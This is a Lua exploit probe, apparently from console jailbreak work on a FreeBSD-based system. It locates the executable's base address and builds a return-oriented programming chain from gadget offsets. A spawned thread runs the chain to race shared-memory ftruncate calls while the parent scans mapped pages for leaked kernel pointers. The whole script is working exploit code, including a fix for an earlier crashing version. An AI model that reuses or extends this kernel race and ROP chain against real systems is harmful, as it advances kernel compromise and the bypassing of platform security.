-- CRASH_CLASS: HIGH
-- PROBE 1102b: SHM ftruncate race — dword-pair chain writes (fixed decomposition)
--
-- 1102a crashed: wq_safe uint64 decomposition was broken.
-- Fix: pre-compute ALL chain values as (lo, hi) number pairs.
-- Use write_dword exclusively for chain. Use write_qword only for
-- structural writes (<10 calls, manageable binary output).

print("=== PROBE 1102b: SHM FTRUNCATE RACE (DWORD PAIRS) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

-- Eboot offset to (lo, hi) pair
local function eoff(off)
    local lo = tlo + off
    local hi = thi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- Parse fn_addr as (lo, hi)
local fn_str = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
print("fn_addr_str=" .. (fn_str or "nil"))
local fn_lo, fn_hi = 0, 0
if fn_str then
    local hs, ls = fn_str:match("^0x(%x+)(%x%x%x%x%x%x%x%x)$")
    if hs then fn_hi = tonumber(hs, 16) or 0; fn_lo = tonumber(ls, 16) or 0
    else fn_hi = 0; fn_lo = tonumber(fn_str) or 0 end
end
print(string.format("fn_addr=0x%X%08X", fn_hi, fn_lo))

-- Pre-compute gadget (lo, hi) pairs
local par_lo, par_hi = eoff(0x992)       -- pop_rax_ret
local pdr_lo, pdr_hi = eoff(0xC9DFE)     -- pop_rdi_ret
local psr_lo, psr_hi = eoff(0xD77D)      -- pop_rsi_ret
local mdr_lo, mdr_hi = eoff(0x92C67)     -- mov [rdi], rax; ret

-- Find jmp$ (EB FE) in eboot
local jmp_lo, jmp_hi = par_lo, par_hi  -- fallback to bare ret
for off = 0, 0x100000, 2 do
    local b = rd(tlo + off)
    if b and (b % 0x10000) == 0xFEEB then
        jmp_lo, jmp_hi = eoff(off)
        print(string.format("jmp$=eboot+0x%X", off))
        break
    end
end

local sc455 = mk(455)
local sc480 = mk(480)
local sc482 = mk(482)
local sc477 = mk(477)

-- Create SHM object
local LARGE = 0x40000
local SMALL = 0x4000

local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
if shm_fd < 0 then print("FAILED") return end

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))
if map_n == 0 then print("mmap FAILED") return end

-- Write sentinels
for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- Allocate child stack via mmap
local stack = sc477(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local stack_n = N(stack)
print("stack=" .. fmt(stack))

-- Fake TCB (structural writes, <5 qword writes total)
local tcb = memory.alloc(0x1000)
wq(tcb, tcb)
local fsb = memory.alloc(8)
wq(fsb, tcb)
local fsb_n = N(fsb)

-- Done flag
local done_flag = memory.alloc(8)
wq(done_flag, uint64(0))
local done_n = N(done_flag)

-- RSP
local rsp = math.floor((stack_n + 0x10000) / 16) * 16 - 8

-- Write chain using DWORD PAIRS only
-- put(offset, lo, hi) writes a qword at rsp + offset*8
local function put(idx, lo, hi)
    wd(rsp + idx * 8, lo)
    wd(rsp + idx * 8 + 4, hi or 0)
end

local ITERS = 200
local pos = 0

print(string.format("writing chain (%d iters)...", ITERS))

-- sysarch(165, SET_FSBASE=129, &fsb)
put(pos, 165, 0);                   pos = pos + 1  -- rax = 165
put(pos, pdr_lo, pdr_hi);           pos = pos + 1  -- pop rdi; ret
put(pos, 129, 0);                   pos = pos + 1  -- rdi = 129
put(pos, psr_lo, psr_hi);           pos = pos + 1  -- pop rsi; ret
put(pos, fsb_n, 0);                 pos = pos + 1  -- rsi = &fsb
put(pos, fn_lo, fn_hi);             pos = pos + 1  -- syscall stub
put(pos, par_lo, par_hi);           pos = pos + 1  -- pop rax; ret

-- Ftruncate loop
for i = 1, ITERS do
    put(pos, 480, 0);               pos = pos + 1  -- rax = SYS_FTRUNCATE
    put(pos, pdr_lo, pdr_hi);       pos = pos + 1
    put(pos, shm_fd, 0);            pos = pos + 1
    put(pos, psr_lo, psr_hi);       pos = pos + 1
    put(pos, SMALL, 0);             pos = pos + 1
    put(pos, fn_lo, fn_hi);         pos = pos + 1
    put(pos, par_lo, par_hi);       pos = pos + 1

    put(pos, 480, 0);               pos = pos + 1
    put(pos, pdr_lo, pdr_hi);       pos = pos + 1
    put(pos, shm_fd, 0);            pos = pos + 1
    put(pos, psr_lo, psr_hi);       pos = pos + 1
    put(pos, LARGE, 0);             pos = pos + 1
    put(pos, fn_lo, fn_hi);         pos = pos + 1
    put(pos, par_lo, par_hi);       pos = pos + 1
end

-- Write done marker
put(pos, 0xDEAD1102, 0);            pos = pos + 1  -- rax = marker
put(pos, pdr_lo, pdr_hi);           pos = pos + 1
put(pos, done_n, 0);                pos = pos + 1  -- rdi = &done_flag
put(pos, mdr_lo, mdr_hi);           pos = pos + 1  -- mov [rdi], rax; ret
put(pos, jmp_lo, jmp_hi);           pos = pos + 1  -- park

print(string.format("chain: %d entries (%d bytes, %d dword writes)", pos, pos * 8, pos * 2))

-- Build thr_param (structural writes via wq, <6 calls)
local tid_ptr = memory.alloc(8)
wq(tid_ptr, uint64(0))

local param = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(param) + i, 0) end
wq(param, uint64(string.format("0x%X%08X", par_hi, par_lo)))  -- start_func = pop_rax_ret
-- arg = 0 (already zeroed)
wq(uint64(N(param) + 0x10), stack)                             -- stack_base
wq(uint64(N(param) + 0x18), uint64(0x10000))                   -- stack_size
wq(uint64(N(param) + 0x30), uint64(N(tid_ptr)))                -- child_tid

print("launching child...")
local ok1, ret1 = pcall(function()
    return sc455(uint64(N(param)), uint64(0x38))
end)
print("thr_new=" .. (ok1 and tostring(N(ret1)) or "PCALL-FAIL"))

if not ok1 or N(ret1) ~= 0 then
    print("FAILED alive=" .. tostring(alive()))
    print("=== PROBE 1102b FAILED ===")
    return
end

local x = 0; for k = 1, 5000 do x = x + k end
local tid = rd(N(tid_ptr))
print("child_tid=" .. (tid or "nil"))

-- RACE: parent reads boundary pages while child ftruncates
print("")
print("--- RACING ---")
local kptr_count = 0
local fault_count = 0
local anomaly_count = 0
local zero_count = 0
local read_count = 0

for round = 1, 2000 do
    for pg = 1, 7 do
        local off = pg * 0x4000
        local val = rq(uint64(map_n + off))
        read_count = read_count + 1
        if val == nil then
            fault_count = fault_count + 1
            if fault_count <= 5 then
                print(string.format("  [FAULT] round %d pg %d", round, pg))
            end
        else
            local h, l = 0, 0
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else l = N(val) end
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 20 then
                    print(string.format("  [KPTR!] round %d pg %d: 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            else
                local exp_l = 0xAA000000 + pg
                local exp_h = 0xBB000000 + pg
                if l ~= exp_l or h ~= exp_h then
                    anomaly_count = anomaly_count + 1
                    if anomaly_count <= 20 then
                        print(string.format("  [ANOM] r%d p%d: 0x%08X%08X", round, pg, h, l))
                    end
                end
            end
        end
    end

    local df = rd(done_n)
    if df and df == 0xDEAD1102 then
        print(string.format("child done after round %d", round))
        break
    end

    for pg = 1, 7 do
        wd(map_n + pg * 0x4000, 0xAA000000 + pg)
        wd(map_n + pg * 0x4000 + 4, 0xBB000000 + pg)
    end
end

print("")
print(string.format("reads=%d faults=%d kptrs=%d anomalies=%d zeros=%d",
    read_count, fault_count, kptr_count, anomaly_count, zero_count))
print("alive=" .. tostring(alive()))
print("")
print("=== PROBE 1102b COMPLETE ===")
